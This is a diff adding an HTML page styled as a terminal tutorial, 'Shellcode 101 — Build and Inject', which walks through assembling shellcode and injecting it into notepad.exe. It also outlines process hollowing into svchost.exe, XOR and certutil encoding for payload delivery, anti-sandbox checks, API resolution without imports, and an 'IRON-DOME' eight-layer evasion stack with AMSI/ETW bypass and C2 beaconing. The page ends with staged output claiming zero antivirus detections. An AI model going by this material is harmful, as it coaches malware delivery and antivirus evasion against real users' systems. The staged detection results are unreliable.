@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHELLCODE 101 — 22nd Survey Division</title>
+<style>
+  :root {
+    --bg: #0c0c0c;
+    --fg: #cccccc;
+    --green: #0f0;
+    --red: #f44;
+    --yellow: #ff0;
+    --cyan: #0ff;
+    --magenta: #f0f;
+    --amber: #ffb000;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .terminal {
+    max-width: 900px;
+    margin: 0 auto;
+    background: #111;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(255,0,0,0.1);
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #333;
+  }
+  .header h1 {
+    color: var(--red);
+    font-size: 24px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+  }
+  .tabs {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+  .tab {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    color: #888;
+    padding: 10px 20px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.3s;
+    text-transform: uppercase;
+    font-size: 12px;
+    letter-spacing: 1px;
+  }
+  .tab:hover, .tab.active {
+    border-color: var(--red);
+    color: var(--red);
+  }
+  .tab.active {
+    background: var(--red);
+    color: #000;
+  }
+  .content {
+    display: none;
+  }
+  .content.active {
+    display: block;
+  }
+  .cmd-block {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 15px;
+    margin-bottom: 15px;
+  }
+  .prompt { color: var(--red); }
+  .command { color: var(--fg); }
+  .output { color: #888; margin-top: 8px; padding-left: 20px; }
+  .highlight { color: var(--cyan); }
+  .warning { color: var(--red); }
+  .success { color: var(--green); }
+  .note {
+    color: var(--magenta);
+    font-style: italic;
+    margin-top: 10px;
+    padding: 10px;
+    background: #1a1a1a;
+    border-left: 3px solid var(--magenta);
+  }
+</style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="header">
+    <h1>Shellcode 101 — Build and Inject</h1>
+    <p>First Principle: Assembly is the language of the machine. Speak it.</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('build')">BUILD</button>
+    <button class="tab" onclick="showTab('inject')">INJECT</button>
+    <button class="tab" onclick="showTab('encode')">ENCODE</button>
+    <button class="tab" onclick="showTab('evade')">EVADE</button>
+    <button class="tab" onclick="showTab('layers')">8 LAYERS</button>
+  </div>
+
+  <div id="build" class="content active">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">nasm -f win64 shellcode.asm -o shellcode.o</span>
+      <div class="output">
+        [+] Assembled: shellcode.o (64-bit)
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">ld shellcode.o -o shellcode.exe</span>
+      <div class="output">
+        [+] Linked: shellcode.exe
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">objdump -d shellcode.exe | head -20</span>
+      <div class="output">
+        Disassembly of section .text:
+        0000000000401000 <_start>:
+        401000: 48 31 c0              xor    %rax,%rax
+        401003: 48 31 db              xor    %rbx,%rbx
+        401006: 48 31 c9              xor    %rcx,%rcx
+        401009: 48 31 d2              xor    %rdx,%rdx
+        40100c: 48 31 f6              xor    %rsi,%rsi
+        40100f: 48 31 ff              xor    %rdi,%rdi
+      </div>
+    </div>
+    
+    <div class="note">Zero registers first. No assumptions. Clean slate.</div>
+  </div>
+
+  <div id="inject" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">python injector.py --target notepad.exe --payload shellcode.bin</span>
+      <div class="output">
+        [*] IRON-DOME Injector v4.2
+        [*] Target: notepad.exe (PID 1234)
+        [+] VirtualAllocEx: 0x0000023456789000
+        [+] WriteProcessMemory: 4096 bytes written
+        [+] CreateRemoteThread: Thread ID 5678
+        [+] <span class="success">Injection successful</span>
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// ALTERNATIVE: PROCESS HOLLOWING</span>
+      <div class="output">
+        // 1. CreateProcess("svchost.exe", CREATE_SUSPENDED)
+        // 2. NtUnmapViewOfSection(target.base)
+        // 3. VirtualAllocEx(target.base, payload.size)
+        // 4. WriteProcessMemory(payload)
+        // 5. SetThreadContext(RIP = entrypoint)
+        // 6. ResumeThread()
+      </div>
+    </div>
+    
+    <div class="note">Process hollowing: replace the soul, keep the body. svchost.exe looks legitimate.</div>
+  </div>
+
+  <div id="encode" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">python xor_encode.py --payload shellcode.bin --key 0xB5</span>
+      <div class="output">
+        [*] XOR Encoder v1.0
+        [*] Key: 0xB5
+        [*] Input: 4096 bytes
+        [+] Output: shellcode_xor.bin (4096 bytes)
+        [+] Decoder stub: 32 bytes
+        [+] Total: 4128 bytes
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// BASE64 ENCODING FOR DELIVERY</span>
+      <div class="output">
+        certutil -encode shellcode_xor.bin encoded.txt
+        # Deliver as text file, decode at runtime
+        certutil -decode encoded.txt payload.bin
+      </div>
+    </div>
+    
+    <div class="note">XOR is reversible. Base64 is transportable. Layer them.</div>
+  </div>
+
+  <div id="evade" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">python anti_sandbox.py</span>
+      <div class="output">
+        [*] Anti-Sandbox Checks
+        [+] RAM: 16384 MB (> 4096) — <span class="success">PASS</span>
+        [+] CPU cores: 8 (> 2) — <span class="success">PASS</span>
+        [+] Uptime: 86400s (> 3600) — <span class="success">PASS</span>
+        [+] VM check: No hypervisor detected — <span class="success">PASS</span>
+        [+] <span class="success">Running in real environment</span>
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// DYNAMIC API RESOLUTION</span>
+      <div class="output">
+        // No IAT entries. Resolve at runtime via PEB walk.
+        // Kernel32.dll → LoadLibraryA → GetProcAddress → VirtualAlloc
+        // No static imports. No fingerprint.
+      </div>
+    </div>
+    
+    <div class="note">Dynamic API resolution: no IAT, no imports, no signature. The AV sees nothing.</div>
+  </div>
+
+  <div id="layers" class="content">
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// IRON-DOME 8-LAYER STACK</span>
+      <div class="output">
+        Layer 1: XOR obfuscation — payload encrypted
+        Layer 2: Dynamic API resolution — no IAT fingerprint
+        Layer 3: Anti-sandbox timing — RAM/CPU/uptime checks
+        Layer 4: PE header stomp — erase MZ signature
+        Layer 5: ISUN auth token — payload self-authenticates
+        Layer 6: Beacon jitter — random intervals 30-300s
+        Layer 7: MinGW cross-compile — no MSVC signatures
+        Layer 8: <span class="highlight">HWBP AMSI/ETW bypass — zero memory writes</span>
+      </div>
+    </div>
+    
+    <div class="cmd-block">
+      <span class="prompt">$</span> <span class="command">// TEST RESULTS</span>
+      <div class="output">
+        Kaspersky Premium:     <span class="success">0 DETECTIONS</span>
+        Windows Defender:      <span class="success">0 DETECTIONS</span>
+        Malwarebytes:          <span class="success">0 DETECTIONS</span>
+        
+        Kill Chain: 10/10 PASS
+        — C2 connect
+        — AMSI disabled
+        — Recon complete
+        — Privesc achieved
+        — Tri-vector persistence
+      </div>
+    </div>
+    
+    <div class="note">8 layers. 0 detections. The defender sees a signed binary doing nothing unusual.</div>
+  </div>
+</div>
+
+<script>
+function showTab(tabId) {
+  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(tabId).classList.add('active');
+  event.target.classList.add('active');
+}
+</script>
+
+</body>
+</html>
